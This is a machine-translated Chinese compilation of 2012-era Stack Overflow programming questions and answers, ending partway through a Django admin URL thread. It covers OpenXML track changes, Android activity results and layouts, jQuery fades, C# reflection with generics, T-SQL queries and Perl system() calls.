[http://jsfiddle.net/CDe3E/](http://jsfiddle.net/CDe3E/)

实际上你可以删除一些员工：

[http://jsfiddle.net/CDe3E/1/](http://jsfiddle.net/CDe3E/1/)

看看这是不是你想要的。

# ms-word - 在没有互操作的情况下启用 Word (docx) 文档跟踪更改

> ID：14039135
> 
> 赞同：1
> 
> 时间：2012-12-26T10:18:54.593
> 
> 标签：ms-word, openxml, openxml-sdk

有没有办法以及如何在不使用互操作程序集的情况下为 MS Word 文档 (docx) 打开跟踪更改功能？我知道它应该用 XML 来完成，但是怎么做呢？谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-26T15:17:14.520

给你，`outputDocument`是`WordprocessingDocument`AKA类型`DocumentFormat.OpenXml.Packaging.WordprocessingDocument`。

```
outputDocument.MainDocumentPart.DocumentSettingsPart.Settings.Append(new TrackRevisions()); 
```

编辑：

您可能想先检查设置是否为`null`. 该类`Settings`有一个完全限定的名称`DocumentFormat.OpenXml.Wordprocessing.Settings`。

# javascript - 无法在 Wordpress 上运行 Javascript

> ID：14039146
> 
> 赞同：0
> 
> 时间：2012-12-26T10:19:14.230
> 
> 标签：javascript, wordpress, dom-events

我在 Javascript 中有这段代码：

```
 <label><b>Promo Code</b></label>
<input type=text value="Enter Coupon here"  name=textbox onclick="change2()">
<input type=button value="Enter" onclick="change()">

<script>
function change2() {
document.all.textbox.value=""
}
function change() {

if(document.all.textbox.value == "30%off")
window.location = "http://www.google.com/"
else if(document.all.textbox.value == "50%off")
window.location = "http://www.yahoo.com/"
else
alert('Please Enter a Valid Coupon!')
}
</script> 
```

不幸的是，我无法在 Wordpress 中使用 html 代码编辑器执行此操作。我也使用了 from source 方法：

```
<script type='text/javascript' 
    src='http://www.website.info/java.js'></script>
</form> 
```

两者似乎都不起作用，我只是放置了文本框和按钮，但是当我单击时，我什么也没得到..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T10:26:42.040

您实际上可以参考这篇文章，将 javascript 添加到您的页面[Wordpress Stackexchange](https://wordpress.stackexchange.com/questions/24075/insert-javascript-in-a-blog-post-or-a-new-page)

上面的链接带有用于 JS 包含的插件。

如果你想破解系统，你可以查看[wp_enqueue_script](http://codex.wordpress.org/Function_Reference/wp_enqueue_script)

# android - Android、scala 和 eclipse = 不稳定的混合

> ID：14039149
> 
> 赞同：5
> 
> 时间：2012-12-26T10:19:24.437
> 
> 标签：android, eclipse, scala, scala-ide

最近，我在 Scala 中编写了一些 Android 应用程序，使用 Eclipse。一切都很好，直到我的程序只有几个课程/活动。当我添加更多代码时，JVM 开始崩溃，eclipse 经常冻结，adb 不断失去连接。任务管理器显示 Java 进程占用了 800 到 1300 MB 内存！

我的电脑的硬件参数非常好，比如 i7 3rd gen、8GB DDR3 和 SSD 256。所以这不是原因。

我的软件也是最新的，包含最新版本的 Eclipse、Android SDK、Scala 和 Java 开发工具包，所有 Eclipse 插件。-vmargs 是为 Scala 开发配置的，但它根本没有帮助。所以我把它作为问题的原因消除了。

当我将我的代码重写为 Java 时，一切都很顺利，我可以继续我的项目。

有没有人已经找到了一些在 Android 项目中使用 scala 的解决方案？我在这里和谷歌群组上阅读了几个类似的主题，但没有关于这个问题的答案。

**编辑：**

我用可视化 vm 分析了我的代码，但堆空间的使用是正常的。这是我的代码的一些片段。

```
imports ...

class MainActivity extends FragmentActivity {
  private lazy val timePicker = findViewById(R.id.timePicker).asInstanceOf[TimePicker]
  private lazy val spinner_sourceBank = findViewById(R.id.spinnerSource).asInstanceOf[Spinner]
  private lazy val spinner_targetBank = findViewById(R.id.spinnerDestination).asInstanceOf[Spinner]
  private lazy val myApplication = getApplication.asInstanceOf[MyApplication]
  private var ignoreTimeChange = false

  override protected def onCreate(savedInstanceState: Bundle) = {
    super.onCreate(savedInstanceState)
    setContentView(R.layout.activity_main)

    timePicker.setIs24HourView(true)
    initializeSpinner(spinner_sourceBank)
    initializeSpinner(spinner_targetBank)
  }

  private def initializeSpinner(spinner: Spinner) = {
    val adapter = ArrayAdapter.createFromResource(this, R.array.banks, R.layout.spinner_item)
    adapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item)
    spinner.setAdapter(adapter)
  }

  def reset(w: View) = {
    timePicker.setCurrentHour(13)
    timePicker.setCurrentMinute(00)
    spinner_sourceBank.setSelection(0)
    spinner_targetBank.setSelection(0)
  }

  def submit(w: View) = {
    if (spinner_sourceBank.getSelectedItemPosition == 0 || spinner_targetBank.getSelectedItemPosition == 0) {
      new AlertDialog.Builder(this).setPositiveButton("OK", new OnClickListener {
        override def onClick(dialog: DialogInterface, which: Int) { dialog dismiss }
      }).setMessage(getString(R.string.alert_title)).setTitle("Alert Dialog").setIcon(android.R.drawable.ic_dialog_alert).create.show
    } else manageFragments(sourceBank, targetBank)
  }

  def manageFragments(sourceBank: String, targetBank: String) = {
    val fragmentTransaction = getSupportFragmentManager.beginTransaction

    if (targetBank == sourceBank) myApplication.setCurrentFragment(MyApplication.NOW)
    else myApplication.setCurrentFragment(MyApplication.FIRST_SESSION)

    fragmentTransaction.replace(R.id.fragment_container, myApplication.getCurrentFragment)
    fragmentTransaction.commit
  }

  override def onCreateOptionsMenu(menu: Menu): Boolean = { getMenuInflater.inflate(R.menu.activity_main, menu); true }
} 
```

我可以在移动设备上测试我的应用程序，它运行得很好。我也可以编写我的代码，但是 eclipse 的行为就像在旧计算机上运行一样——切换选项卡需要很多时间，因此构建和部署。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-05T21:01:01.000

将这些添加到 eclipse.ini（或编辑，如果存在），因为它们更适合 Scala 开发：它们应该出现在 eclipse 条目下方，例如 -vm：

```
-Xverify:none
-Dosgi.requiredJavaVersion=1.6
-Xms900m
-Xmx900m
-Xss2m
-XX:PermSize=256m
-XX:MaxPermSize=256m
-XX:MaxGCPauseMillis=20
-XX:MaxHeapFreeRatio=70
-XX:+ScavengeBeforeFullGC
-XX:+UseParallelOldGC
-XX:+UnlockExperimentalVMOptions
-XX:+UseFastAccessorMethods
-XX:ReservedCodeCacheSize=128m
-XX:+TieredCompilation
-XX:+AggressiveOpts 
```

可能不太可能，但如果您使用的是 CMS GC，请从文件中删除对它的引用。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-01-05T18:57:34.710

虽然我没有在 Android 特定的开发中做到这一点，但我在学习“Scala 中的函数编程原理”Coursera 课程时遇到了类似的问题。结果是 Eclipse JVM 的 PermGen 空间已经达到极限，这导致了各种随机和混乱的 Eclipse 行为。事实证明，在幕后，Scala 编译器生成的类文件数量是大致相同大小的 Java 项目的许多倍。因此，我在 Eclipse 的命令行启动中添加了以下内容：

**-XX:MaxPermSize=256m**

在此之前，我遇到了最奇怪的 Eclipse 错误，在最奇怪的时候，我没有合理的方法来始终如一地重现它们。我在课程的前三周就有了这个。我几乎退出了这门课程，因为我使用的是我为课程明确下载的 TypeSafe 版本的 Eclipse。一旦我将上述内容添加到 Eclipse 的 JVM 启动中，我就没有其他问题了。我无法相信 Scala IDE 有多棒，因为在此之前我从未能够稳定地使用它。

希望这可以帮助。

# android - 另一个子活动中的子活动

> ID：14039150
> 
> 赞同：0
> 
> 时间：2012-12-26T10:19:30.737
> 
> 标签：android, listview, subactivity

我正在开发一个 mediaPlayer 应用程序，我将 ListViews 用于我的播放列表。我有具有 mediaPlayer 的主要活动，当用户单击播放列表按钮时，将启动 ArtistActivity，用户可以从中启动 SongActivity。我查看了许多教程和示例，但出于某种原因，SongActivity 将“0”传递回主要活动并使用歌曲 URL 播放 ArrayList 中的第一首曲目。任何帮助将非常感激。请帮忙。谢谢你。

***主要活动：***

```
 btnPlaylist.setOnClickListener(new View.OnClickListener() {

        public void onClick(View arg0) {
            Intent i = new  Intent(getApplicationContext(),ArtistActivity.class);
            startActivityForResult(i, 100);

        }
    });

}

protected void onActivityResult(int requestCode,
        int resultCode, Intent data) {
    super.onActivityResult(requestCode, resultCode, data);
    if(resultCode == 50)
    {

        currentSongIndex = data.getExtras().getInt("songIndexArtist");

        songIndex = currentSongIndex;

        // play selected song
        playSong(currentSongIndex);

        // Displaying Song title
        String songTitle =
  songsList.get(currentSongIndex).get("songTitle");
        songTitleLabel.setText(songTitle);

    } 
```

***艺术家活动：***

```
lv.setOnItemClickListener(new OnItemClickListener() {

        public void onItemClick(AdapterView<?> parent, View view,
                int position, long id) {

            //int artistIndex = position;

            // Starting new intent
            Intent in2 = new Intent(getApplicationContext(),SongActivity.class);

            startActivityForResult(in2,100);

            setResult(100,in2);

            in2.putExtra("songIndexArtist", songIndexArtist);

            finish();

        }
    });
}
protected void onActivityResult(int requestCode,
        int resultCode, Intent data) {
    super.onActivityResult(requestCode, resultCode, data);
        if(resultCode == 50)
    {

        songIndexArtist = data.getExtras().getInt("songIndex");

    }

} 
```

***歌曲活动：***

```
lv.setOnItemClickListener(new OnItemClickListener() {

        public void onItemClick(AdapterView<?> parent, View view,
                int position, long id) {

            Toast.makeText(getApplicationContext(), "DOWNLOADING, PLEASE WAIT", Toast.LENGTH_LONG).show(); 

            // getting listitem index
            int songIndex = position;

            // Starting new intent
            Intent in3 = new Intent(getApplicationContext(),
                    AndroidBuildingMusicPlayerActivity.class);

            // Sending songIndex to PlayerActivity
            in3.putExtra("songIndex", songIndex);

            setResult(50,in3);

            // Closing PlayListView
            finish();
        }
    });
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-26T10:57:14.500

你混合了`requestCode`和`resultCode`。`resultCode`应该是预定义的常量之一`RESULT_CANCELED`，`RESULT_OK`等等`RESULT_FIRST_USER`。`requestCode`是您的唯一值 - 50、100 等。

此外，在同一活动中的调用和处理程序中`requestCode`应该是相同的。`startActivityForResult``onActivityResult`

例如，在**SongActivity**你应该调用：

```
setResult(RESULT_OK, in3); 
```

在**ArtistActivity**你应该调用：

```
startActivityForResult(in2, 50); 
```

因为您`onActivityResult`在**ArtistActivity**中等待代码 50。

```
lv.setOnItemClickListener(new OnItemClickListener() {
        public void onItemClick(AdapterView<?> parent, View view,
                int position, long id) {
            Intent in2 = new Intent(getApplicationContext(), SongActivity.class);

            // Starting SongActivity and wait for results with requestCode 50
            startActivityForResult(in2, 50);
        }
    });
}

protected void onActivityResult(int requestCode,
        int resultCode, Intent data) {
    super.onActivityResult(requestCode, resultCode, data);
    if(requestCode == 50 && resultCode == RESULT_OK)
    {
        // get results from SongActivity (requestCode = 50)
        songIndexArtist = data.getExtras().getInt("songIndex");

        // now pass the same data into MainActivity
        Intent result = new Intent();
        result.putExtra("songIndexArtist", songIndexArtist);
        setResult(RESULT_OK, result);
        finish();
    }
} 
```

请注意，我将 resultCode 替换为 requestCode。

您应该以类似的方式修复**MainActivity**。

你也可以使用[`FLAG_ACTIVITY_FORWARD_RESULT`flag](http://developer.android.com/reference/android/content/Intent.html#FLAG_ACTIVITY_FORWARD_RESULT) ; 有一个相关的[SO question](https://stackoverflow.com/questions/9135449/how-to-return-a-result-through-multiple-activities)和一个[很好的解释这个标志](http://blog.akquinet.de/2010/04/15/android-activites-and-tasks-series-intent-flags/)（在其他标志中）。如果您“按原样”将结果通过中间活动传回而不进行任何处理，则该标志很有用。

# javascript - jquery淡出/淡入闪烁问题

> ID：14039152
> 
> 赞同：0
> 
> 时间：2012-12-26T10:19:37.103
> 
> 标签：javascript, jquery, css, fadein, fadeout

我已经阅读了几篇关于此的帖子，但似乎没有一个可以解决我的问题，当我淡出画廊时，另一个淡入，效果很好......但是淡入的项目似乎“刷新”或再次淡入（真的很快) 淡入淡出动画完成后，这是我的代码：

我所拥有的基本上是一个包含在“mediaContainer”中的照片库（photographySection），这是css：

```
.mediaContainer {
   position: relative;
}
.photographySection {
    top: 10px;
    left:0;
    position: absolute;
} 
```

html:

```
 <div class='mediaContainer'>              
       <div class='photographySection hidden' id='photographyExperimental'>
            <ul><li><img src...></li></ul>
        </div>
        <div class='photographySection hidden' id='photographyFaces'>
             <ul><li><img src...></li></ul>
        </div>
 </div> 
```

js：

```
$(".photographyMenu").click(function(event){
    $(".photographySection").hide(1,function() { // hide all sections
        var section = $(event.target).attr("section"); // read new section to show
        $("#"+section).fadeIn(500); // for example $("#photographyFaces")
    }); 
}); 
```

一切顺利，但有时在选择的 div 淡入后，它会由于某种原因闪烁/闪烁一次

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T10:33:26.333

对于这样一个简单的任务，您真的需要所有这些标记吗？如果你想要的只是淡入淡出一堆图像，你可以这样做：

html标记：

```
<div class="mediaContainer">
    <img src="" />
    <img src="" />
    <img src="" />
</div> 
```

jQuery：

```
function fadeInOut(){
    var imgs = $('.mediaContainer > img');
    imgs.wrapAll('<div class="slideshow" />');

    $('.slideshow > img:gt(0)').hide();
    setInterval(function(){
        $('.slideshow > img:first')
            .fadeOut(500)
            .next('img')
            .fadeIn(500)
            .end()
            .appendTo('.slideshow');
    }, 5000);
} 
```

也许更有经验的人可以改进此代码。您还可以将 vars 设置为那些“幻数”（500/5000）和其他一些东西，但这应该可以用更少的代码解决问题（只是一个选项）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-01T15:51:43.283

只是不要使用500，它会更流畅，慢是600毫秒，正常是400毫秒

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-26T11:10:32.313

你可以试试这个：http: **[//jsfiddle.net/S4sbm/](http://jsfiddle.net/S4sbm/)**

```
$(".photographySection:gt(0)").hide();
    $(".photographyMenu").click(function(event){   
    $(".photographySection").fadeOut(500);    
    var section = $(event.target).attr("section"); // read new section to show         
    $("#"+section+':hidden').fadeIn(500); // for example $("#photographyFaces")        
}); 
```

检查小提琴，看看这是否有帮助。

# c# - 我可以使用反射中的类型作为类型参数吗？

> ID：14039153
> 
> 赞同：4
> 
> 时间：2012-12-26T10:19:37.300
> 
> 标签：c#, .net, generics, generic-method

我可以使用反射中的类型作为类型参数吗？例如，我想根据传递的对象选择一个持久化器：

```
IPersister GetPersisterFor(IEntity entity)
{
    return GetPersisterFor<entity.GetType()>(); // <-- this cannot be compiled
}

IPersister GetPersisterFor<TEntity>() where TEntity : IEntity
{
    //some logic to get persister...
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-26T10:29:35.317

只能通过反射；您需要使用`GetMethod`来获取`MethodInfo`通用方法，然后调用`MakeGenericMethod(entity.GetType()).Invoke(this, null);`它。

然而，更容易通过动态作弊：

```
IPersister Evil<T>(T obj) where T : IEntity {
    return GetPersisterFor<T>();
} 
```

并制作第一种方法：

```
return Evil((dynamic)entity); 
```

这是一个动态表达式，它将为您检测要使用的正确 T（称为 Evil-of-T）。

注意：您需要额外方法的唯一原因是确保它不会递归地解析回自身，因为名称相同。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-26T10:30:56.773

是的，您需要获取通用方法定义。之后，您可以使用[`MethodInfo.MakeGenericMethod`](http://msdn.microsoft.com/en-us/library/system.reflection.methodinfo.makegenericmethod.aspx)构造泛型方法。

所以像：

```
MethodInfo genericMethodDefinition = GetType()
    .GetMethods(BindingFlags.Instance | BindingFlags.NonPublic)
    .Where(method => method.IsGenericMethod && method.Name == "GetPersisterFor")
    .First();

// OR

MethodInfo genericMethodDefinition = GetType().GetMethod("GetPersisterFor",
    BindingFlags.Instance | BindingFlags.NonPublic, null, Type.EmptyTypes, null);

// THEN

MethodInfo genericMethod = genericMethodDefinition.MakeGenericMethod(entity.GetType());
genericMethod.Invoke(this, null); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-26T10:52:35.960

因为泛型和非泛型方法具有相同的名称，所以您必须遍历类的所有方法以找到合适的方法，然后调用它：

```
public IPersister GetPersisterFor(IEntity entity)
{       
    MethodInfo getPersisterForGenericMethod = 
                    GetType().GetMethods()
                        // iterate over all methods to find proper generic implementation
                        .Single(methodInfo => methodInfo.Name == "GetPersisterFor" && methodInfo.IsGenericMethod)
                        // supply it with generic type parameter
                        .MakeGenericMethod(entity.GetType());

    // invoke it
    return getPersisterForGenericMethod.Invoke(this, null) as IPersister;
}

public IPersister GetPersisterFor<TEntity>() where TEntity : IEntity
{
    return null;
} 
```

ps：完整的源代码可在[gist.github 获得](https://gist.github.com/4379572)

# android - 尝试为具有待处理请求的会话请求新权限

> ID：14039154
> 
> 赞同：3
> 
> 时间：2012-12-26T10:19:38.070
> 
> 标签：android, facebook, permissions

嗨，我正在使用新的 facebook SDK 3.0 开发 android 应用程序。

我尝试在用户登录后请求“publish_stream”权限。所以，在 onSessionStateChange() 中，我输入了请求“publsh_stream”权限的代码，但它不起作用。

这是我的代码：

```
private void onSessionStateChange(Session session, SessionState state, Exception exception) {

    if (state.isOpened()) {

        if (pendingPublishReauthorization &&   state.equals(SessionState.OPENED_TOKEN_UPDATED)) {
            pendingPublishReauthorization = false;
            publishFeed(userName);
        }

        m_pd.show();
        Request.executeMeRequestAsync(session, new Request.GraphUserCallback() {
            @Override
            public void onCompleted(GraphUser user, Response response) {
                if (user != null) {

                    String username=buildUserInfoDisplay(user);
                    userName=username;
                    saveAccount(username, "facebook");

                    Log.d(com.dress.folio.Constants.FACEBOOK_TAG, "login success");
                    //publishFeed(userName);
                    m_pd.dismiss();

                    h.postDelayed(irun, 1000);
                    Activity GetActivity=getActivity();
                    if(GetActivity != null) GetActivity.finish();

                }
            }
        });

        List<String> permissions = session.getPermissions();
        if (!isSubsetOf(PERMISSIONS, permissions) ) {

            pendingPublishReauthorization = true;
            //if(state == SessionState.OPENED_TOKEN_UPDATED) {
                Session.NewPermissionsRequest newPermissionsRequest = new Session.NewPermissionsRequest(this, PERMISSIONS);
                session.requestNewPublishPermissions(newPermissionsRequest);
            //}

        }

    } else if (state.isClosed()) {
        Log.i(com.dress.folio.Constants.FACEBOOK_TAG, "Logged out..." + exception);
    }
} 
```

在行 session.requestNewPublishPermissions(newPermissionsRequest); 处，编译器总是说错误，例如：尝试为具有待处理请求的会话请求新权限。

用户 facebook SSO 在我的应用程序中登录后，如何立即请求 publish_stream。？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-01-17T01:00:29.153

我只是面临同样的问题， onActivityResult 方法被覆盖了。所以请确保调用：

```
@Override
public void onActivityResult(int requestCode, int resultCode, Intent data) {
    super.onActivityResult(requestCode, resultCode, data);
   Session.getActiveSession().onActivityResult(this, requestCode, resultCode, data);

} 
```

此方法应在之后调用您的回调。更多信息在这里（第 6 节）： [https ://developers.facebook.com/docs/getting-started/facebook-sdk-for-android/3.0/](https://developers.facebook.com/docs/getting-started/facebook-sdk-for-android/3.0/)

# sql-server - 如何删除此 SQL 子句重复？

> ID：14039156
> 
> 赞同：1
> 
> 时间：2012-12-26T10:19:41.597
> 
> 标签：sql-server, tsql, duplicates, query-optimization

我有 2 个查询在同一张表上以相同的条件执行 SELECT。你能帮我删除这个重复吗？

```
if exists(select count(1)    
              from (<table>) t   
              where  (<condition>)   
              having count(1) = 1)   
    set @yes = 1    

if @yes = 1    
    select @x = X   
        from (<table>) t   
        where  (<condition>) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-26T10:41:13.027

您的代码相当于：

```
select @yes = 1,@x=max(X) from (<table>) t   
       where  (<condition>)   
       having count(1) = 1 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-26T10:29:20.417

`EXISTS`可以作为另一个`WHERE`条件：

```
SELECT @x = X
FROM   <table> t
WHERE  <condition>
AND    EXISTS (
    SELECT 1
    FROM   <table> t1
    WHERE  <condition>
    HAVING count(*) = 1
    ); 
```

基本上它仅在`X`只有*row qualifying*时才会选择。 或者（可能更快）：`<table>`

 *```
SELECT @x = X
FROM  <table> t
WHERE <condition>
AND NOT EXISTS (
    SELECT 1
    FROM   <table> t1
    WHERE  <condition>
    AND    t1.id <> t.id     -- no other row satisfies same conditions
    ); 
```

`id`是主键或`<table>`.
反向逻辑：仅选择符合条件的行，如果*没有其他行符合条件*。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-26T10:29:32.007

请检查你是否是这个意思：

```
 select 
      @x = X   
    from 
      (<table>) t   
    where  
      (<condition>)
    group by X
    having count(*) = 1 
```

或者

```
select 
    @x = X  
from(
    select 
        count(*) over() cnt, X    
    from 
        (<table>) t  
    where  
        (<condition>)
)a
WHERE a.cnt=1 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-26T10:33:04.103

如果表中的“X”字段不为空，则可以使用此查询：

```
SET @x = null

SELECT @x = X   
        FROM (<table>) t   
        WHERE (<condition>)
IF (@x IS NOT NULL) BEGIN SET @yes = 1 END 
```*

# perl - perl 中的系统命令

> ID：14039159
> 
> 赞同：1
> 
> 时间：2012-12-26T10:20:02.533
> 
> 标签：perl, bash

我需要运行一个系统命令，该命令将转到一个目录并删除不包括文件的子目录（如果存在）。我编写了以下命令来执行此操作：

```
system("cd /home/faizan/test/cache ; for i in *\; do if [ -d \"$i\" ]\; then echo \$i fi done"); 
```

上面的命令不断抛出语法错误。我尝试了多种组合，但仍然不清楚这应该如何进行。请建议。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-26T10:46:19.493

好吧，您的命令行确实包含语法错误。试试这个：

```
system("cd /home/faizan/test/cache ; for i in *; do if [ -d \"\$i\" ]; then echo \$i; fi; done"); 
```

或者更好的是，首先只遍历目录；

```
system("for i in /home/faizan/test/cache/*/.; do echo \$i; done"); 
```

或者更好的是，不要循环：

```
system("echo /home/faizan/test/cache/*/."); 
```

（我想你会想要`rmdir`而不是`echo`一旦它被正确调试。）

或者更好的是，全部在 Perl 中完成。这里没有什么需要`system()`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-26T10:40:12.993

由于问题标题代表`system`命令，这将直接回答，但使用 bash 的示例命令仅包含仅在 perl 中更简单的内容（使用`opendir`和`-d`在 perl 中查看其他答案）。

如果您想使用`system`（而不是`open $cmdHandle,"bash -c ... |"`），执行命令（如`system`or ）的首选语法`exec`是让`perl`解析命令行。

试试这个（就像你已经做过的那样）：

```
perl -e 'system("bash -c \"echo hello world\"")'
hello world

perl -e 'system "bash -c \"echo hello world\"";'
hello world 
```

现在更好，相同但`perl`确保命令行解析，试试这个：

```
perl -e 'system "bash","-c","echo hello world";'
hello world 
```

显然有3个`system`命令参数：

1.  重击
2.  -C
3.  剧本

或更多：

```
perl -e 'system "bash","-c","echo hello world;date +\"Now it is %T\";";'
hello world
Now it is 11:43:44 
```

正如您在最后一个目的中看到的那样，命令行的bash*脚本*部分没有双*引号。*

 ***注意：在命令行上，使用`perl -e '...'`or `perl -e "..."`，使用引号和双引号有点重。在脚本中，您可以混合它们：

```
system 'bash','-c','for ((i=10;i--;));do printf "Number: %2d\n" $i;done'; 
```

甚至：

```
system 'bash','-c','for ((i=10;i--;));do'."\n".
                       'printf "Number: %2d\n" $i'."\n".
                       'done'; 
```

使用点`.`来*连接*（脚本部分）字符串的一部分，总是有 3 个参数。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-26T10:50:08.107

您仍然最好先将其作为 bash 命令尝试。正确格式化可以更清楚地表明您缺少语句终止符：

```
for i in *; do
    if [ -d "$i" ]; then
        echo $i
    fi
done 
```

并通过用分号替换新行来浓缩这一点（除了`do`/之后`then`）：

```
for i in *; do if [ -d "$i" ]; then echo $i; fi; done 
```

或者如前所述，只需在 Perl 中执行（我还没有测试到实际上取消注释 remove_tree - 小心！）：

```
use strict;
use warnings;

use File::Path 'remove_tree';
use feature 'say';

chdir '/tmp';
opendir my $cache, '.';
while (my $item = readdir($cache)) {
    if ($item !~ /^\.\.?$/ && -d $item) {
        say "Deleting '$item'...";
        # remove_tree($item);
    }
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-26T10:57:53.027

**使用系统**

```
my @args = ("cd /home/faizan/test/cache ; for i in *; do if [ -d \"\$i\" ]; then echo \$i; fi; done");
system(@args); 
```

**使用子程序**

```
sub do_stuff {
  my @args = ( "bash", "-c", shift );
  system(@args);
}

do_stuff("cd /home/faizan/test/cache ; for i in *; do if [ -d \"\$i\" ]; then echo \$i; fi; done"); 
```*

# android - 充气时Android xml合并布局错误

> ID：14039162
> 
> 赞同：24
> 
> 时间：2012-12-26T10:20:13.170
> 
> 标签：android, android-layout

我有一`CustomView`堂课，我想为它使用 xml 布局。因此，我的类扩展`RelativeLayout`、扩展 xml 布局并尝试将其附加到自身。

```
public class CustomView extends RelativeLayout
{
  public CustomView (Context context)
  {
     super(context);
     LayoutInflater.from(context).inflate(R.layout.layers_list_item, this, true);
  }
} 
```

如果我的 xml 布局有一些布局（例如，线性）作为根元素，它可以正常工作。但是当我尝试`<merge>`根据[这个响应](https://stackoverflow.com/a/5535518/1738427/ "Android中带有XML布局的自定义视图")使用标签时，我得到了这个错误：

`<merge /> can be used only with a valid ViewGroup root and attachToRoot=true`

我的 xml 布局是这样的：

```
<?xml version="1.0" encoding="utf-8"?>
<merge xmlns:android="http://schemas.android.com/apk/res/android"
     ... >

     <CheckBox
        ... />

     <TextView
        ... />

</merge> 
```

我还尝试从`<merge... >`标签中删除所有属性，得到了相同的结果。怎么了？

**更新**：上面的代码是正确的。正如*secretlm 所*提到的，问题在于它`<merge>`被用作 a`root element`并在另一段 od 代码中膨胀：

```
ArrayAdapter<String> adapter = 
    new ArrayAdapter<String>(this, 
                             R.layout.layers_list_item, 
                             R.id.layers_list_item_text); 
```

并且随着添加的每个元素，适配器都试图以`R.layout.layers_list_item`root`<merge>`身份膨胀。

* * *

## 回答 #1

> 赞同：35
> 
> 时间：2012-12-26T11:47:01.817

如果没有容器元素，您不能在最终布局中使用`<merge>`。`root element`“当您知道此布局将被放置到已经包含适当父视图以包含该元素的子级的布局中时，将其用作根元素很有用。当您计划将此布局包含在另一个布局中时，这特别有用文件使用并且此布局不需要不同的 ViewGroup 容器”——来自“developer.android.com”

这个例子展示了如何使用`<merge>`： http: [//www.coderzheaven.com/2011/06/26/merge-two-layout-xml-in-android/](http://www.coderzheaven.com/2011/06/26/merge-two-layout-xml-in-android/)

**更新：**

您应该尝试使用此示例中的 Constructor(Context, AttributeSet)。我认为它会解决你的问题。

文件 test.xml：

```
<?xml version="1.0" encoding="utf-8"?>
<merge
 xmlns:android="http://schemas.android.com/apk/res/android">

     <CheckBox
        android:id="@+id/layers_list_item_switch"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_alignRight="@id/layers_list_item_root"    
        android:layout_alignParentRight="true"
        android:layout_marginLeft="15dp"        
        android:button="@drawable/ic_launcher" />

     <TextView
        android:id="@+id/layers_list_item_text"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:layout_gravity="left|center_vertical"
        android:layout_toLeftOf="@id/layers_list_item_switch"
        android:selectAllOnFocus="true"
        android:text="tret"
        android:ellipsize="marquee"
        android:focusable="true"
        android:focusableInTouchMode="true"
        android:marqueeRepeatLimit="marquee_forever"
        android:singleLine="true"
        android:scrollHorizontally="true"
        android:textColor="@android:color/black"
        android:textSize="16sp"
        android:textStyle="bold"
        android:typeface="serif"
        android:clickable="true" />

</merge> 
```

从 RelativeLayout 扩展的测试类：

```
public class Test extends RelativeLayout
{       
    public Test(Context context, AttributeSet attrs) {
        super(context, attrs);      
        LayoutInflater.from(context).inflate(R.layout.test, this, true);    
    }
} 
```

主要活动：

```
public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }    
} 
```

主要布局：

```
<com.example.testlayout.Test
    xmlns:android="http://schemas.android.com/apk/res/android"           
    android:id="@+id/layers_list_item_root"
    android:layout_height = "fill_parent"
    android:layout_width = "fill_parent"      
    /> 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2020-09-16T08:05:44.497

```
Make sure to specify the complete path from source root in the main layout like this

`<com.example.testlayout.Test      xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/layers_list_item_root"
    android:layout_height = "fill_parent"
    android:layout_width = "fill_parent"      
    />`

and not like this 
`<Test      xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/layers_list_item_root"
    android:layout_height = "fill_parent"
    android:layout_width = "fill_parent"      
    />` 
```

# django - Django 中的自定义管理界面

> ID：14039171
> 
> 赞同：1
> 
> 时间：2012-12-26T10:20:48.897
> 
> 标签：django, django-admin, static-files, django-staticfiles, django-1.4

Django 的文档提供了一种安装`admin`应用程序的简单方法。它假定文件结构如下：

```
mysite/
    manage.py
    mysite/
          settings.py #adding `admin` under `INSTALLED_APPS`
          __init__.py
          urls.py #adding urls
          wsgi.py
    myapp/
    __init__.py
    admin.py #creating this file
    models.py
    views.py 
```

`admin`如果我的结构如下，我的问题是如何让界面工作：

```
mysite/
      manage.py
      settings.py
      __init__.py
      urls.py
      myapp/
          __init__.py
          forms.py
          models.py
          views.py 
```

`admin`为了使界面正常工作，我必须进行哪些更改。[我的其他应用程序正在运行]。我已经多次阅读文档。我正在使用`Django` `1.4`.

**编辑#1**

我在运行时遇到此错误`localhost:8000/admin/`：

```
error at /admin/
unknown specifier: ?P[ 
```

[整个错误在这里](http://dpaste.com/852582/)。

我的`urls.py`文件有以下行[如文档中所示]：

```
from django.contrib import admin
admin.autodiscover()
urlpatterns = patterns('',
    (r'^admin/(.*)', include(admin.site.urls)),
) 
```

我`admin.py`在`myapp`文件夹中的文件有代码：

```
import models
from django.contrib import admin

class PostAdmin(admin.ModelAdmin):
    prepopulated_fields = {"slug": ("title",)}

admin.site.register(models.Article, PostAdmin) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T10:56:22.293

This is how you're supposed to include the admin urls:

```
url(r'^admin/', include(admin.site.urls)), 
```

